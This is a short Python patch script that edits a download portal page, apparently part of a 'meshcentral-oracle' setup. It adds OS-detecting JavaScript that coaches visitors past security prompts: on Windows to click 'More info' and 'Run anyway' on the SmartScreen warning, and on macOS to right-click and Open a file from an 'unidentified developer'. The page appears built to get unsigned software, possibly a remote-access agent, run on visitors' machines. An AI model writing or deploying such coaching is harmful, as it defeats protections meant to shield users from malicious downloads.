p = 'meshcentral-oracle/mh1/portal.html'
s = open(p).read()
s = s.replace('</style>', '.coach{display:none;margin-top:14px;font-size:13px;color:#5f6f80;background:#f4f6f8;border:1px solid #e8ecf0;border-radius:6px;padding:10px 12px;line-height:1.45}\n</style>')
s = s.replace('</div></main>', '<div class="coach" id="co"></div>\n</div></main>')
old_js = "document.getElementById('go').onclick=start;"
new_js = """var ua=navigator.userAgent,co=document.getElementById('co');
if(/Windows/.test(ua)){co.innerHTML='If Windows says <b>protected your PC</b>, click <b>More info</b> then <b>Run anyway</b>.';co.style.display='block'}
else if(/Macintosh/.test(ua)){co.innerHTML='If it says <b>unidentified developer</b>, right-click the file and choose <b>Open</b> — do not double-click.';co.style.display='block'}
document.getElementById('go').onclick=start;"""
s = s.replace(old_js, new_js)
open(p, 'w').write(s)
print('patched, coach count:', s.count('coach'))